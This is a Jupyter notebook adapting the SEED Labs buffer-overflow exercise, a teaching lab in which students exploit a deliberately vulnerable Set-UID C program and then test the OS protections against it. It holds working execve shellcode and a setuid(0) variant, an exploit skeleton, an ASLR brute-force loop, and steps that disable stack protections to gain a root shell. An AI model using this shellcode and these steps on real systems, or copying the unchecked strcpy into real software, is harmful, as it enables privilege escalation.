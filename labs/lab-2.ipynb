{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### <center> SEED Labs – Buffer Overflow Vulnerability\n",
    "    \n",
    "The content of this lab notebook is based on the SEED Labs by Dr. Wenliang Du, Syracuse University. The original copyright passage and license are retained.\n",
    "\n",
    "Copyright © 2006 - 2016 Wenliang Du, Syracuse University.\n",
    "\n",
    "The development of this document was partially funded by the National Science Foundation under Award\n",
    "No. 1303306 and 1318814. This work is licensed under a Creative Commons Attribution - Non Commercial Share Alike\n",
    "4.0 International License. A human-readable summary of (and not a substitute for) the license is\n",
    "the following: You are free to copy and redistribute the material in any medium or format. You must give\n",
    "appropriate credit. If you remix, transform, or build upon the material, you must distribute your contributions\n",
    "under the same license as the original. You may not use the material for commercial purposes."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### 1. Overview\n",
    "The learning objective of this lab is for students to gain the first-hand experience on buffer-overflow vulnerability\n",
    "by putting what they have learned about the vulnerability from class into action. Buffer overflow is\n",
    "defined as the condition in which a program attempts to write data beyond the boundaries of pre-allocated\n",
    "fixed length buffers. This vulnerability can be used by a malicious user to alter the flow control of the program,\n",
    "leading to the execution of malicious code. This vulnerability arises due to the mixing of the storage\n",
    "for data (e.g. buffers) and the storage for controls (e.g. return addresses): an overflow in the data part can\n",
    "affect the control flow of the program, because an overflow can change the return address.\n",
    "In this lab, students will be given a program with a buffer-overflow vulnerability; their task is to develop\n",
    "a scheme to exploit the vulnerability and finally gain the root privilege. In addition to the attacks, students\n",
    "will be guided to walk through several protection schemes that have been implemented in the operating\n",
    "system to counter against buffer-overflow attacks. Students need to evaluate whether the schemes work or\n",
    "not and explain why. This lab covers the following topics:\n",
    "\n",
    "- Buffer overflow vulnerability and attack\n",
    "- Stack layout in a function invocation\n",
    "- Shellcode\n",
    "- Address randomization\n",
    "- Non-executable stack\n",
    "- StackGuard"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# setup temporary directory\n",
    "!mkdir tmp"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### 2. Lab Tasks"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### 2.1 Turning Off Countermeasures\n",
    "\n",
    "You can execute the lab tasks using our pre-built Ubuntu virtual machines. Ubuntu and other Linux\n",
    "distributions have implemented several security mechanisms to make the buffer-overflow attack difficult.\n",
    "To simplify our attacks, we need to disable them first. Later on, we will enable them one by one, and see\n",
    "whether our attack can still be successful.\n",
    "\n",
    "**Address Space Randomization**\n",
    "Ubuntu and several other Linux-based systems uses address space randomization to randomize the starting address of heap and stack. This makes guessing the exact addresses difficult; guessing addresses is one of the critical steps of buffer-overflow attacks. In this lab, we disable this feature using the following command:\n",
    "```\n",
    "$ sudo sysctl -w kernel.randomize_va_space=0\n",
    "```\n",
    "\n",
    "**The StackGuard Protection Scheme**\n",
    "The GCC compiler implements a security mechanism called StackGuard\n",
    "to prevent buffer overflows. In the presence of this protection, buffer overflow attacks will not work.\n",
    "We can disable this protection during the compilation using the `-fno-stack-protector` option. For example,\n",
    "to compile a program example.c with StackGuard disabled, we can do the following:\n",
    "\n",
    "```\n",
    "$ gcc -fno-stack-protector example.c\n",
    "```\n",
    "\n",
    "**Non-Executable Stack**\n",
    "\n",
    "Ubuntu used to allow executable stacks, but this has now changed: the binary images of programs (and shared libraries) must declare whether they require executable stacks or not, i.e., they need to mark a field in the program header. Kernel or dynamic linker uses this marking to decide whether to make the stack of this running program executable or non-executable. This marking is done automatically by the recent versions of gcc, and by default, stacks are set to be non-executable. To change that, use the following option when compiling programs:\n",
    "\n",
    "For executable stack:\n",
    "\n",
    "```\n",
    "$ gcc -z execstack -o test test.c\n",
    "```\n",
    "\n",
    "For non-executable stack:\n",
    "\n",
    "```\n",
    "$ gcc -z noexecstack -o test test.c\n",
    "```\n",
    "\n",
    "**Configuring /bin/sh (Ubuntu 16.04 VM only)**\n",
    "\n",
    "In both Ubuntu 12.04 and Ubuntu 16.04 VMs, the `/bin/sh` symbolic link points to the `/bin/dash` shell. However, the dash program in these two VMs have an important difference. The dash shell in Ubuntu 16.04 has a countermeasure that prevents itself\n",
    "from being executed in a Set-UID process. Basically, if dash detects that it is executed in a Set-UID process, it immediately changes the effective user ID to the process’s real user ID, essentially dropping the privilege. The dash program in Ubuntu 12.04 does not have this behavior. Since our victim program is a Set-UID program, and our attack relies on running `/bin/sh`, the countermeasure in `/bin/dash` makes our attack more difficult. Therefore, we will link `/bin/sh` to another shell that does not have such a countermeasure (in later tasks, we will show that with a little bit more effort, the countermeasure in /bin/dash can be easily defeated). We have installed a shell program called zsh in our Ubuntu 16.04 VM. We use the following commands to link `/bin/sh` to zsh (there is no need to do these in Ubuntu 12.04):\n",
    "\n",
    "```\n",
    "$ sudo rm /bin/sh\n",
    "$ sudo ln -s /bin/zsh /bin/sh\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### 2.2 Task 1: Running Shellcode\n",
    "\n",
    "Before starting the attack, let us get familiar with the shellcode. A shellcode is the code to launch a shell. It\n",
    "has to be loaded into the memory so that we can force the vulnerable program to jump to it. The following program\n",
    "shows how to launch a shell by executing a shellcode stored in a buffer. Please compile and run the following\n",
    "code, and see whether a shell is invoked."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "%%writefile tmp/shell_code.c\n",
    "/* A program that launches a shell using shellcode */\n",
    "#include <stdlib.h>\n",
    "#include <stdio.h>\n",
    "#include <string.h>\n",
    "const char code[] =\n",
    "\"\\x31\\xc0\" /* Line 1: xorl %eax,%eax */\n",
    "\"\\x50\" /* Line 2: pushl %eax */\n",
    "\"\\x68\"\"//sh\" /* Line 3: pushl $0x68732f2f */\n",
    "\"\\x68\"\"/bin\" /* Line 4: pushl $0x6e69622f */\n",
    "\"\\x89\\xe3\" /* Line 5: movl %esp,%ebx */\n",
    "\"\\x50\" /* Line 6: pushl %eax */\n",
    "\"\\x53\" /* Line 7: pushl %ebx */\n",
    "\"\\x89\\xe1\" /* Line 8: movl %esp,%ecx */\n",
    "\"\\x99\" /* Line 9: cdq */\n",
    "\"\\xb0\\x0b\" /* Line 10: movb $0x0b,%al */\n",
    "\"\\xcd\\x80\" /* Line 11: int $0x80 */\n",
    ";\n",
    "int main(int argc, char **argv)\n",
    "{\n",
    "  char buf[sizeof(code)];\n",
    "  strcpy(buf, code);\n",
    "  ((void(*)( ))buf)( );\n",
    "}"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "From a terminal, compile and run the code above using the following gcc command. In the following shell, copy the commands you executed and describe your observations.\n",
    "Please do not forget to use the execstack option, which allows code to be executed from the\n",
    "stack; without this option, the program will fail.\n",
    "\n",
    "```\n",
    "$ gcc -z execstack -o call_shellcode call_shellcode.c\n",
    "```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# description here"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "The shellcode above invokes the execve() system call to execute `/bin/sh`. A few places in this\n",
    "shellcode are worth mentioning. First, the third instruction pushes `//sh`, rather than `/sh` into the stack.\n",
    "This is because we need a 32-bit number here, and `/sh` has only 24 bits. Fortunately, `//` is equivalent to\n",
    "`/`, so we can get away with a double slash symbol. Second, before calling the execve() system call, we\n",
    "need to store name[0] (the address of the string), name (the address of the array), and NULL to the %ebx,\n",
    "%ecx, and %edx registers, respectively. Line 5 stores name[0] to %ebx; Line 8 stores name to %ecx;\n",
    "Line 9 sets %edx to zero. There are other ways to set %edx to zero (e.g., xorl %edx, %edx); the one\n",
    "(cdq) used here is simply a shorter instruction: it copies the sign (bit 31) of the value in the EAX register\n",
    "(which is 0 at this point) into every bit position in the EDX register, basically setting %edx to 0. Third, the\n",
    "system call execve() is called when we set %al to 11, and execute `int $0x80`."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### 2.3 The Vulnerable Program\n",
    "\n",
    "You will be provided with the following program, which has a buffer-overflow vulnerability in **Line 1**. Your\n",
    "job is to exploit this vulnerability and gain the root privilege."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "%%writefile tmp/stack.c\n",
    "/* Vulnerable program: stack.c */\n",
    "#include <stdlib.h>\n",
    "#include <stdio.h>\n",
    "#include <string.h>\n",
    "int bof(char *str)\n",
    "{\n",
    "  char buffer[24];\n",
    "  /* The following statement has a buffer overflow problem */\n",
    "  strcpy(buffer, str); //Line 1\n",
    "  return 1;\n",
    "}\n",
    "int main(int argc, char **argv)\n",
    "{\n",
    "  char str[517];\n",
    "  FILE *badfile;\n",
    "  badfile = fopen(\"badfile\", \"r\");\n",
    "  fread(str, sizeof(char), 517, badfile);\n",
    "  bof(str);\n",
    "  printf(\"Returned Properly\\n\");\n",
    "  return 1;\n",
    "}"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "From a terminal, compile the above vulnerable program. Do not forget to include the `-fno-stack-protector` and `-z execstack` options to turn off the StackGuard and the non-executable stack protections. After the compilation, we need to make the program a root-owned Set-UID program. \n",
    "\n",
    "```\n",
    "$ gcc -o stack -z execstack -fno-stack-protector stack.c\n",
    "$ sudo chown root stack ➀\n",
    "$ sudo chmod 4755 stack ➁\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "The above program has a buffer overflow vulnerability. It first reads an input from a file called badfile,\n",
    "and then passes this input to another buffer in the function bof(). The original input can have a maximum\n",
    "length of 517 bytes, but the buffer in bof() is only 24 bytes long. Because strcpy() does not check\n",
    "boundaries, buffer overflow will occur. Since this program is a Set-root-UID program, if a normal user can\n",
    "exploit this buffer overflow vulnerability, the normal user might be able to get a root shell. It should be\n",
    "noted that the program gets its input from a file called badfile. This file is under users’ control. Now, our\n",
    "objective is to create the contents for badfile, such that when the vulnerable program copies the contents\n",
    "into its buffer, a root shell can be spawned."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### 2.4 Task 2: Exploiting the Vulnerability\n",
    "\n",
    "You are provided with a partially completed exploit code called \"exploit.c\". The goal of this code is to\n",
    "construct contents for badfile. In this code, the shellcode is given to you. You need to develop the rest."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "%%writefile exploit.c\n",
    "/* exploit.c */\n",
    "#include <stdlib.h>\n",
    "#include <stdio.h>\n",
    "#include <string.h>\n",
    "char shellcode[] =\n",
    "\"\\x31\\xc0\" /* Line 1: xorl %eax,%eax */\n",
    "\"\\x50\" /* Line 2: pushl %eax */\n",
    "\"\\x68\"\"//sh\" /* Line 3: pushl $0x68732f2f */\n",
    "\"\\x68\"\"/bin\" /* Line 4: pushl $0x6e69622f */\n",
    "\"\\x89\\xe3\" /* Line 5: movl %esp,%ebx */\n",
    "\"\\x50\" /* Line 6: pushl %eax */\n",
    "\"\\x53\" /* Line 7: pushl %ebx */\n",
    "\"\\x89\\xe1\" /* Line 8: movl %esp,%ecx */\n",
    "\"\\x99\" /* Line 9: cdq */\n",
    "\"\\xb0\\x0b\" /* Line 10: movb $0x0b,%al */\n",
    "\"\\xcd\\x80\" /* Line 11: int $0x80 */\n",
    ";\n",
    "void main(int argc, char **argv)\n",
    "{\n",
    "  char buffer[517];\n",
    "  FILE *badfile;\n",
    "  /* Initialize buffer with 0x90 (NOP instruction) */\n",
    "  memset(&buffer, 0x90, 517);\n",
    "  /* You need to fill the buffer with appropriate contents here */\n",
    "  /* ... Put your code here ... */\n",
    "  /* Save the contents to the file \"badfile\" */\n",
    "  badfile = fopen(\"./badfile\", \"w\");\n",
    "  fwrite(buffer, 517, 1, badfile);\n",
    "  fclose(badfile);\n",
    "}"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "After you finish the above program, compile and run it in a terminal. This will generate the contents for badfile.\n",
    "Then run the vulnerable program stack. If your exploit is implemented correctly, you should be able to\n",
    "get a root shell.\n",
    "\n",
    "**Important:** Please compile your vulnerable program first. Please note that the program exploit.c,\n",
    "which generates the badfile, can be compiled with the default StackGuard protection enabled. This is\n",
    "because we are not going to overflow the buffer in this program. We will be overflowing the buffer in stack.c,\n",
    "which is compiled with the StackGuard protection disabled.\n",
    "\n",
    "```\n",
    "$ gcc -o exploit exploit.c\n",
    "$./exploit // create the badfile\n",
    "$./stack // launch the attack by running the vulnerable program\n",
    "# <---- Bingo! You’ve got a root shell!\n",
    "```\n",
    "\n",
    "It should be noted that although you have obtained the “#” prompt, your real user id is still yourself (the\n",
    "effective user id is now root). You can check this by typing the following:\n",
    "\n",
    "```\n",
    "# id\n",
    "uid=(500) euid=0(root)\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### 2.5 Task 3: Defeating dash’s Countermeasure\n",
    "As we have explained before, the dash shell in Ubuntu 16.04 drops privileges when it detects that the\n",
    "effective UID does not equal to the real UID. This can be observed from dash program’s changelog. We\n",
    "can see an additional check in Line 1, which compares real and effective user/group IDs.\n",
    "\n",
    "```\n",
    "// https://launchpadlibrarian.net/240241543/dash_0.5.8-2.1ubuntu2.diff.gz\n",
    "// main() function in main.c has following changes:\n",
    "++ uid = getuid();\n",
    "++ gid = getgid();\n",
    "++ /*\n",
    "++ * To limit bogus system(3) or popen(3) calls in setuid binaries,\n",
    "++ * require -p flag to work in this situation.\n",
    "++ */\n",
    "++ if (!pflag && (uid != geteuid() || gid != getegid())) { //Line 1\n",
    "SEED Labs – Buffer Overflow Vulnerability Lab 8\n",
    "++ setuid(uid);\n",
    "++ setgid(gid);\n",
    "++ /* PS1 might need to be changed accordingly. */\n",
    "++ choose_ps1();\n",
    "++ }\n",
    "```\n",
    "\n",
    "The countermeasure implemented in dash can be defeated. One approach is not to invoke /bin/sh in\n",
    "our shellcode; instead, we can invoke another shell program. This approach requires another shell program,\n",
    "such as zsh to be present in the system. Another approach is to change the real user ID of the victim process\n",
    "to zero before invoking the dash program. We can achieve this by invoking `setuid(0)` before executing\n",
    "`execve()` in the shellcode. In this task, we will use this approach. We will first change the `/bin/sh`\n",
    "symbolic link, so it points back to `/bin/dash`:\n",
    "\n",
    "```\n",
    "$ sudo rm /bin/sh\n",
    "$ sudo ln -s /bin/dash /bin/sh\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "To see how the countermeasure in dash works and how to defeat it using the system call setuid(0),\n",
    "we write the following C program. We first comment out Line 1 and run the program as a Set-UID\n",
    "program (the owner should be root); please describe your observations. We then uncomment Line 1 and\n",
    "run the program again; please describe your observations."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "%%writefile tmp/dash_shell_test.c\n",
    "// dash_shell_test.c\n",
    "#include <stdio.h>\n",
    "#include <sys/types.h>\n",
    "#include <unistd.h>\n",
    "int main()\n",
    "{\n",
    "  char *argv[2];\n",
    "  argv[0] = \"/bin/sh\";\n",
    "  argv[1] = NULL;\n",
    "  // setuid(0); //Line 1\n",
    "  execve(\"/bin/sh\", argv, NULL);\n",
    "  return 0;\n",
    "}"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "In a terminal, compile and run the above program using the following commands (we need to make it\n",
    "root-owned Set-UID program):\n",
    "\n",
    "```\n",
    "$ gcc dash_shell_test.c -o dash_shell_test\n",
    "$ sudo chown root dash_shell_test\n",
    "$ sudo chmod 4755 dash_shell_test\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "From the above experiment, we will see that seuid(0) makes a difference. Let us add the assembly\n",
    "code for invoking this system call at the beginning of our shellcode, before we invoke execve().\n",
    "\n",
    "```\n",
    "char shellcode[] =\n",
    "\"\\x31\\xc0\" /* Line 1: xorl %eax,%eax */\n",
    "\"\\x31\\xdb\" /* Line 2: xorl %ebx,%ebx */\n",
    "\"\\xb0\\xd5\" /* Line 3: movb $0xd5,%al */\n",
    "\"\\xcd\\x80\" /* Line 4: int $0x80 */\n",
    "// ---- The code below is the same as the one in Task 2 ---\n",
    "SEED Labs – Buffer Overflow Vulnerability Lab 9\n",
    "\"\\x31\\xc0\"\n",
    "\"\\x50\"\n",
    "\"\\x68\"\"//sh\"\n",
    "\"\\x68\"\"/bin\"\n",
    "\"\\x89\\xe3\"\n",
    "\"\\x50\"\n",
    "\"\\x53\"\n",
    "\"\\x89\\xe1\"\n",
    "\"\\x99\"\n",
    "\"\\xb0\\x0b\"\n",
    "\"\\xcd\\x80\"\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "The updated shellcode adds 4 instructions: \n",
    "- (1) set ebx to zero in Line 2, \n",
    "- (2) set eax to 0xd5 via Line 1 and 3 (0xd5 is setuid()’s system call number), \n",
    "- and (3) execute the system call in Line 4. \n",
    "\n",
    "Using this shellcode, we can attempt the attack on the vulnerable program when `/bin/sh` is linked to `/bin/dash`.\n",
    "Using the above shellcode in exploit.c, try the attack from Task 2 again and see if you can get a root\n",
    "shell. Please describe and explain your results."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### 2.6 Task 4: Defeating Address Randomization\n",
    "\n",
    "On 32-bit Linux machines, stacks only have 19 bits of entropy, which means the stack base address can have $2^{19} = 524, 288$ possibilities. This number is not that high and can be exhausted easily with the brute-force approach. In this task, we use such an approach to defeat the address randomization countermeasure on our 32-bit VM. First, we turn on the Ubuntu’s address randomization using the following command. We run the same attack developed in Task 2. Please describe and explain your observation.\n",
    "\n",
    "```\n",
    "$ sudo /sbin/sysctl -w kernel.randomize_va_space=2\n",
    "```\n",
    "\n",
    "We then use the brute-force approach to attack the vulnerable program repeatedly, hoping that the address\n",
    "we put in the badfile can eventually be correct. You can use the following shell script to run the\n",
    "vulnerable program in an infinite loop. If your attack succeeds, the script will stop; otherwise, it will keep\n",
    "running. Please be patient, as this may take a while. Let it run overnight if needed. Please describe your\n",
    "observation."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "%%writefile tmp/brute_force.sh\n",
    "#!/bin/bash\n",
    "SECONDS=0\n",
    "value=0\n",
    "while [ 1 ]\n",
    "do\n",
    "  value=$(( $value + 1 ))\n",
    "  duration=$SECONDS\n",
    "  min=$(($duration / 60))\n",
    "  sec=$(($duration % 60))\n",
    "  echo \"$min minutes and $sec seconds elapsed.\"\n",
    "  echo \"The program has been running $value times so far.\"\n",
    "  ./stack\n",
    "done"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "!chmod 755 tmp/brute_force.sh"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# describe your observation here. (Hints: how long does it take for you to finish/)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### 2.7 Task 5: Turn on the StackGuard Protection\n",
    "\n",
    "Before working on this task, remember to turn off the address randomization first, or you will not know\n",
    "which protection helps achieve the protection. In our previous tasks, we disabled the StackGuard protection mechanism in GCC when compiling the programs. In this task, you may consider repeating task 1 in the presence of StackGuard. To do that,\n",
    "you should compile the program without the -fno-stack-protector option. For this task, you will recompile the vulnerable program, stack.c, to use GCC StackGuard, execute task 1 again, and report your observations. You may report any error messages you observe. In GCC version 4.3.3 and above, StackGuard is enabled by default. Therefore, you have to disable StackGuard using the switch mentioned before. In earlier versions, it was disabled by default. If you use a older GCC version, you may not have to disable StackGuard."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# description"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### 2.8 Task 6: Turn on the Non-executable Stack Protection\n",
    "Before working on this task, remember to turn off the address randomization first, or you will not know\n",
    "which protection helps achieve the protection.\n",
    "In our previous tasks, we intentionally make stacks executable. In this task, we recompile our vulnerable\n",
    "program using the noexecstack option, and repeat the attack in Task 2. Can you get a shell? If not, what\n",
    "is the problem? How does this protection scheme make your attacks difficult. You should describe your\n",
    "observation and explanation in your lab report. You can use the following instructions to turn on the nonexecutable\n",
    "stack protection.\n",
    "\n",
    "```\n",
    "$ gcc -o stack -fno-stack-protector -z noexecstack stack.c\n",
    "```\n",
    "\n",
    "It should be noted that non-executable stack only makes it impossible to run shellcode on the stack, but it\n",
    "does not prevent buffer-overflow attacks, because there are other ways to run malicious code after exploiting\n",
    "a buffer-overflow vulnerability. "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# description"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.6.5"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
